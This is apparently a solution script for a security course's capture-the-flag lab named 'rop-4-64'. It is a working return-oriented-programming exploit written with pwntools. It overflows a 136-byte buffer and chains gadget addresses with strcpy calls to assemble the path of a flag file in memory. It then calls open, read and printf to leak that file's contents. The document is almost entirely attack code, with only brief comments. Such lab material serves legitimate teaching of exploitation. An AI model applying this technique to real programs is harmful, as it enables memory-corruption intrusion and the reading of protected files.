#!/usr/bin/env python


# use this script like this:
#   $ ./script.py > input
#   $ (cat input) | ./rop-4-64

from pwn import *

# some syscalls and other stuff:
"""
0x00000000004005a0  printf@plt
0x00000000004005b0  read@plt
0x00000000004005d0  open@plt
0x00000000004006e2  strcpy

0x0000000000400863 : pop rdi ; ret
0x000000000040073f : pop rdx ; nop ; pop rbp ; ret
0x0000000000400861 : pop rsi ; pop r15 ; ret
"""

read_addr = p64(0x00000000004005b0)
printf_addr = p64(0x00000000004005a0)
open_addr = p64(0x00000000004005d0)
strcpy_addr = p64(0x00000000004006e2)
rdi_ret = p64(0x0000000000400863)
rdx_rbp_ret = p64(0x000000000040073f)
rsi_r15_ret = p64(0x0000000000400861)
zeros = p64(0)

g_buf = 0x601000 + 0x800
g_buf_orig = 0x601000 + 0x800

# now lets build some strings
alph_addr = 0x400890
slash_addr = p64(0x400908)
alph_str = "the quick brown fox jumps over the lazy dog!"
zero_addr = p64(alph_addr + len(alph_str))

num_addr = 0x4008c0
num_str = "I also put this for you: 1234567890-\0"
target_str = "/home/labs/week5/rop-4-64/flag\0"

buf = "A"*136
for c in target_str:
    if c == "/":
        #buf += strcpy_addr + pop2_ret + p64(g_buf) + slash_addr
        buf += rdi_ret + p64(g_buf) + rsi_r15_ret + slash_addr + zeros + strcpy_addr
    elif c.isalpha():
        #t_addr = p64(alph_addr + (alph_str.index(c)))
        #buf += strcpy_addr + pop2_ret + p64(g_buf) + t_addr
        t_addr = p64(alph_addr + (alph_str.index(c)))
        buf += rdi_ret + p64(g_buf) + rsi_r15_ret + t_addr + zeros + strcpy_addr
    else:
        #t_addr = p64(num_addr + (num_str.index(c)))
        #buf += strcpy_addr + pop2_ret + p64(g_buf) + t_addr
        t_addr = p64(num_addr + (num_str.index(c)))
        buf += rdi_ret + p64(g_buf) + rsi_r15_ret + t_addr + zeros + strcpy_addr
    g_buf += 1

# open("flag", 0)
#buf += open_addr + pop2_ret + p64(g_buf_orig) + zeros
buf += rdi_ret + p64(g_buf_orig) + rsi_r15_ret + zeros*2 + open_addr
# read(3, g_buf, 100)
#buf += read_addr + pop3_ret + p64(3) + p64(g_buf) + p64(100)
buf += rdi_ret + p64(3) + rsi_r15_ret + p64(g_buf) + zeros + rdx_rbp_ret + p64(100) + zeros + read_addr
# printf(g_buf)
#buf += printf_addr + printf_addr + p64(g_buf) + zeros
buf += rdi_ret + p64(g_buf) + printf_addr
print(buf)

